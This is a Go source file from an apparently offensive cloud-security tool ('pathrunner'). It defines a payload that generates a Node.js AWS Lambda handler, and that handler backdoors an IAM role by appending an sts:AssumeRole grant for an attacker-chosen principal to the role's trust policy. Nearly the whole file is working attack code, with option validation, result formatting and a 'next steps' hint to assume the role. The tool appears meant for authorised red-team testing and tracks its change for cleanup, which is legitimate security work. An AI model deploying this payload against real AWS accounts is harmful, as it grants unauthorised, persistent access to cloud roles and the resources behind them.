// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// BackdoorUpdateRoleTrustNodejsPayload modifies a role's trust policy to add a trusted principal.
// Node.js equivalent of backdoor/update-role-trust — for use with UpdateFunctionCode modules
// targeting existing Node.js Lambda functions.
type BackdoorUpdateRoleTrustNodejsPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorUpdateRoleTrustNodejsPayload{})
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) GetName() string {
	return "backdoor/update-role-trust-nodejs"
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) GetDescription() string {
	return "Update a role's trust policy to add a trusted principal (Node.js runtime)"
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "IAM role name or ARN whose trust policy will be modified",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN, account ID, or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust-nodejs payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust-nodejs payload")
	}
	return nil
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	code := `'use strict';

// SDK v2/v3 compatibility shim — works across all Node.js Lambda runtimes
async function getIAMClient() {
  try {
    const { IAMClient } = require('@aws-sdk/client-iam');
    return { client: new IAMClient({}), version: 3 };
  } catch (_) {
    const AWS = require('aws-sdk');
    return { client: new AWS.IAM(), version: 2 };
  }
}

exports.handler = async (event, context) => {
  const targetRole = process.env.TARGET_ROLE || '';
  const trustPrincipal = process.env.TRUST_PRINCIPAL || '';

  // Extract role name from ARN if provided
  let roleName = targetRole;
  if (targetRole.startsWith('arn:') && targetRole.includes(':role/')) {
    roleName = targetRole.split(':role/').pop();
  }

  // Determine principal type for the trust policy statement
  let principalSpec;
  if (trustPrincipal.endsWith('.amazonaws.com')) {
    principalSpec = { Service: trustPrincipal };
  } else if (/^\d{12}$/.test(trustPrincipal)) {
    principalSpec = { AWS: 'arn:aws:iam::' + trustPrincipal + ':root' };
  } else {
    principalSpec = { AWS: trustPrincipal };
  }

  const { client, version } = await getIAMClient();

  try {
    // Fetch the current trust policy
    let trustPolicyDoc;
    if (version === 3) {
      const { GetRoleCommand } = require('@aws-sdk/client-iam');
      const resp = await client.send(new GetRoleCommand({ RoleName: roleName }));
      trustPolicyDoc = JSON.parse(decodeURIComponent(resp.Role.AssumeRolePolicyDocument));
    } else {
      const resp = await client.getRole({ RoleName: roleName }).promise();
      trustPolicyDoc = JSON.parse(decodeURIComponent(resp.Role.AssumeRolePolicyDocument));
    }

    // Append a new Allow statement granting sts:AssumeRole to the new principal
    trustPolicyDoc.Statement.push({
      Effect: 'Allow',
      Principal: principalSpec,
      Action: 'sts:AssumeRole',
    });

    const updatedDoc = JSON.stringify(trustPolicyDoc);

    if (version === 3) {
      const { UpdateAssumeRolePolicyCommand } = require('@aws-sdk/client-iam');
      await client.send(new UpdateAssumeRolePolicyCommand({ RoleName: roleName, PolicyDocument: updatedDoc }));
    } else {
      await client.updateAssumeRolePolicy({ RoleName: roleName, PolicyDocument: updatedDoc }).promise();
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        status: 'success',
        message: 'Trust policy updated for ' + roleName,
        role_name: roleName,
        trust_principal: trustPrincipal,
        next_steps: 'Use sts:AssumeRole or sts-001 module to assume this role',
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ status: 'error', message: 'Failed to update trust policy: ' + err.message }),
    };
  }
};
`
	return code, nil
}

// ReportSideEffects returns the trust policy modification as a tracked resource for cleanup.
func (p *BackdoorUpdateRoleTrustNodejsPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetRole := options["TARGET_ROLE"]
	roleName := targetRole
	if strings.HasPrefix(targetRole, "arn:") && strings.Contains(targetRole, ":role/") {
		parts := strings.SplitN(targetRole, ":role/", 2)
		if len(parts) == 2 {
			roleName = parts[1]
		}
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy-%s", roleName),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"role_name":       roleName,
				"trust_principal": options["TRUST_PRINCIPAL"],
			},
		},
	}
}

func (p *BackdoorUpdateRoleTrustNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Update Role Trust Results (Node.js) ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Trust policy updated successfully!\n\n")
			if roleName, ok := parsedBody["role_name"].(string); ok {
				output.WriteString("Role: " + roleName + "\n")
			}
			if principal, ok := parsedBody["trust_principal"].(string); ok {
				output.WriteString("Added principal: " + principal + "\n")
			}
			if next, ok := parsedBody["next_steps"].(string); ok {
				output.WriteString("\nNext steps: " + next + "\n")
			}
		} else {
			output.WriteString("Failed to update trust policy\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
